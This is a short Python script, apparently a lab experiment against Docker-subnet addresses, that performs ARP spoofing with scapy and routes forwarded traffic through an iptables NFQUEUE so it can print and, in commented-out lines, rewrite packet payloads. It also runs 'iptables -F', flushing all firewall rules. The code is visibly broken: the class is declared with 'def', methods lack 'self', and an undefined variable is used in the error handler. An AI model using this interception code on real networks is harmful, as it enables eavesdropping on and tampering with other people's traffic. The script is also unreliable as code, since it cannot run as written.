from netfilterqueue import NetfilterQueue
from threading import Thread
from scapy.all import *
from time import sleep
import os

def MiTM:
    def __init__(self, A, B):
        os.system("iptables -A FORWARD -j NFQUEUE --queue-num 1")

    def __del__(self):
        os.system("iptables -F") 

    def get_mac(self, ip):
        req = Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip)
        ans = srp(req, timeout=5, verbose=False)[0]

        return ans[0][1].hwsrc

    def spoof(self, target_ip, spoof_ip):
        pkt = ARP(op = 2, pdst=target_ip, hwdst=get_mac(target_ip),psrc=spoof_ip)

        send(pkt, verbose=False)

    def MiTM(target_ip, spoof_ip):
        while True:
            spoof(target_ip, spoof_ip)
            #spoof(spoof_ip, target_ip)

            sleep(5)

def packet_function(packet):
    pkt = IP(packet.get_payload())
    

    print("Andai vendiendo cigarro", pkt['Raw'])
#    if pkt.haslayer('Raw'):
#
#        pkt['Raw'] = pkt['Raw'][::-1]
#        packet.set_payload( bytes( pkt ) )
#    else:
#        print("x\r",end="")

    packet.accept()


queue = NetfilterQueue()
queue.bind(1, packet_function)

try:
    #os.system("iptables -I INPUT -d 172.17.0.0/16 -j NFQUEUE --queue-num 1")


    #mitm = Thread(target=MiTM, args=["172.17.0.3", "172.17.0.4"])
    #mitm.start()

    queue.run()
except:
    mitm.join()
    os.system("iptables -F")

os.system("iptables -F")
